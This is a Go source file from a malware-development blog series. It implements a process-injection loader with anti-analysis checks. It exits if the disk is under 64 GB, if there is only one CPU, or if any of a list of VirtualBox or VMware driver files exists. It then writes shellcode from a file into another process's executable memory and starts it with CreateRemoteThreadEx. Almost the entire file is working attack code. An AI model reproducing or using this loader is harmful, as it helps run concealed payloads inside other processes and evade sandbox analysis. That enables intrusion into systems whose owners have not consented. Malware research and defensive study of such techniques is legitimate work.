package main

/*

Author: D3Ext
Blog post: https://d3ext.github.io/posts/malware-dev-6/

*/

import (
  "os"
  "fmt"
  "log"
  "unsafe"
  "strconv"
  "runtime"
  "io/ioutil"

  "golang.org/x/sys/windows"
)

type MemStatusEx struct { // Auxiliary struct to retrieve total memory
  dwLength     uint32
  dwMemoryLoad uint32
  ullTotalPhys uint64
  ullAvailPhys uint64
  unused       [5]uint64
}

func main(){
  kernel32 := windows.NewLazyDLL("kernel32.dll")

  GetDiskFreeSpaceExW := kernel32.NewProc("GetDiskFreeSpaceExW")

  lpTotalNumberOfBytes := int64(0)
  diskret, _, err := GetDiskFreeSpaceExW.Call(
    uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("C:\\"))),
    uintptr(0),
    uintptr(unsafe.Pointer(&lpTotalNumberOfBytes)),
    uintptr(0),
  )
  
  if diskret == 0 {
    log.Fatal(err)
  }

  if int(lpTotalNumberOfBytes) < 68719476736 {
    os.Exit(0)
  }

  if runtime.NumCPU() < 2 {
    os.Exit(0)
  }

  drivers := []string{"C:\\Windows\\System32\\drivers\\VBoxMouse.sys","C:\\Windows\\System32\\drivers\\VBoxGuest.sys","C:\\Windows\\System32\\drivers\\VBoxSF.sys","C:\\Windows\\System32\\drivers\\VBoxVideo.sys","C:\\Windows\\System32\\vboxdisp.dll","C:\\Windows\\System32\\vboxhook.dll","C:\\Windows\\System32\\vboxmrxnp.dll","C:\\Windows\\System32\\vboxogl.dll","C:\\Windows\\System32\\vboxoglarrayspu.dll","C:\\Windows\\System32\\vboxservice.exe","C:\\Windows\\System32\\vboxtray.exe","C:\\Windows\\System32\\VBoxControl.exe","C:\\Windows\\System32\\drivers\\vmmouse.sys","C:\\Windows\\System32\\drivers\\vmhgfs.sys","C:\\Windows\\System32\\drivers\\vmci.sys","C:\\Windows\\System32\\drivers\\vmmemctl.sys","C:\\Windows\\System32\\drivers\\vmmouse.sys","C:\\Windows\\System32\\drivers\\vmrawdsk.sys","C:\\Windows\\System32\\drivers\\vmusbmouse.sys"}
  for _, d := range drivers { // Iterate over all drivers to check if they exist
    _, err = os.Stat(d)
    if (os.IsNotExist(err) == false) {
      os.Exit(0)
    }
  }

  pid := os.Args[1]
  shellcode_file := os.Args[2]

  fmt.Println("Process ID: " + pid)
  fmt.Println("Shellcode file: " + shellcode_file)

  // Convert CLI argument to int
  pid_int, _ := strconv.Atoi(pid)

  // Open given path
  f, err := os.Open(shellcode_file)
  if err != nil {
    log.Fatal(err)
  }
  defer f.Close()

  // Get content as bytes
  shellcode, err := ioutil.ReadAll(f)
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println("Loading DLLs and functions...")
  OpenProcess := kernel32.NewProc("OpenProcess")
  VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
  WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
  CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
  CloseHandle := kernel32.NewProc("CloseHandle")

  fmt.Println("Calling OpenProcess...")
  procHandle, _, _ := OpenProcess.Call(
    uintptr(0x1F0FFF), // Access to the process
    uintptr(0), // FALSE
    uintptr(pid_int), // Process to open
  )

  if procHandle == 0 {
    fmt.Println("An error has ocurred calling OpenProcess")
    os.Exit(0)
  }

  addr, _, _ := VirtualAllocEx.Call(
    uintptr(procHandle),
    0,
    uintptr(len(shellcode)),
    windows.MEM_COMMIT | windows.MEM_RESERVE,
    windows.PAGE_EXECUTE_READWRITE,
  )

  if (addr == 0) {
    fmt.Println("An error has ocurred")
    os.Exit(0)
  }

  WriteProcessMemory.Call(
    uintptr(procHandle),
    addr,
    (uintptr)(unsafe.Pointer(&shellcode[0])),
    uintptr(len(shellcode)),
  )

  CreateRemoteThreadEx.Call(
    uintptr(procHandle),
    0,
    0,
    addr,
    0,
    0,
    0,
  )

  _, _, err = CloseHandle.Call(procHandle)
  if err != nil {
    log.Fatal(err)
  }
}
